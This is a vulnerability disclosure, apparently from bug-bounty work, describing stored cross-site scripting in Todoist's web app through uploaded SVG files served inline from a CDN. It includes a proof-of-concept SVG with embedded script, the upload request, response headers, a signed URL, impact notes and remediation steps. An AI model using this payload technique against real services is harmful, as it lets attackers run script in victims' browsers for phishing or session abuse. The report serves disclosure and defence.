# Todoist Web — Stored XSS via SVG Upload (CDN Render)

**Class:** Stored XSS (unsafe SVG rendering)  
**Where:** `POST /api/v1/uploads` → `files.todoist.com` → signed `*.cloudfront.net`  
**Tested:** 2025‑09 (webapp ~8895–8896)

## Summary
Uploaded **SVG** files are returned with `Content-Type: image/svg+xml` and **inline** disposition from a signed CloudFront URL. No sanitization or CSP sandbox is applied, so embedded JavaScript executes when a user opens the attachment from a Todoist task/comment.

## PoC payload
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <script><![CDATA[
    alert(prompt("sender_sefa_basnak"));
  ]]></script>
  <rect width="10" height="10" fill="red"/>
</svg>
```

## Request (snippet)
```
POST /api/v1/uploads HTTP/2
Host: app.todoist.com
Authorization: Bearer <REDACTED>
Content-Type: multipart/form-data; boundary=...

--BOUNDARY
Content-Disposition: form-data; name="file_name"

poc.svg
--BOUNDARY
Content-Disposition: form-data; name="file_type"

image/svg+xml
--BOUNDARY
Content-Disposition: form-data; name="file"; filename="poc.svg"
Content-Type: image/svg+xml

<svg>...</svg>
--BOUNDARY--
```

**Response (truncated)**
```json
{
  "file_url": "https://files.todoist.com/.../by/<uid>/as/file.svg",
  "file_type": "image/svg+xml",
  "upload_state": "completed"
}
```

Following redirects yields a signed CloudFront URL that returns:
```
HTTP/2 200
content-type: image/svg+xml
content-disposition: inline; filename*=UTF-8''poc.svg
```
Opening this URL executes the script (prompt/alert visible).  
**Sample signed URL (redacted):**  
`https://d1ysz50cxb9zwl.cloudfront.net/1aToair2YBxqoRsAwZVrdzlufYa1AajDsNO1CDhyCWdPEQbBObmpfZcdTM9XVm7g/by/55662985/as/file.svg?Expires=1758934670&Signature=FlpVPrhpHokoeK~fQ3KhUGwYB5cjIE8JxVNGeAXEk8ERKMz42LceDK9O4WRQo~B77Pa2jC-89mXn-U-QLqkO8RvwtbovJ-HmgjyP2snUOh5m4xlA30dGzqM3F32P~Yman1Sb2Upejnhzd6YCReX5-d0qPzCzswqT2VdcoQ4PkDAAEq-Qrcj~s8I8FVcbGspy1IHdRU5JNEtPejDHz9ndJpTy1VbM0a2m1uGW-dd7kwV8LHUxOY04CGO-8g8SxfZh22PTs1bgvdudTeR7fvoVm3DoDsinsABU8PPsiTl78reB19kpPNnWmeU-CY8ybZQZMETRW3rFvJU77NESteL3Pg__&Key-Pair-Id=APKAJAERRT46LD6FN4NA
https://files.todoist.com/1aToair2YBxqoRsAwZVrdzlufYa1AajDsNO1CDhyCWdPEQbBObmpfZcdTM9XVm7g/by/55662985/as/file.svg`

## Screenshots
![Screenshot](images/poc-upload.jpeg)
![Screenshot](images/poc-upload2.png)
![Screenshot](images/poc-success.png)

## Impact
- Arbitrary JavaScript execution when viewing the attachment on the CDN origin.
- Instant phishing/redirect via `location=...` inside SVG.
- Potential reverse‑tabnabbing if links ever open without `rel="noopener"`.

## Remediation
- Serve SVGs as downloads: `Content-Disposition: attachment`.
- Apply strict per‑file CSP: `Content-Security-Policy: sandbox; default-src 'none'; img-src data:`.
- Sanitize/strip `<script>`, event handlers, external refs—or rasterize SVG server‑side.
- Enforce `rel="noopener noreferrer"` on all external links.

## Credits
Discovered by **Sefa Başnak** ([@sefabasnak](https://github.com/sefabasnak)).
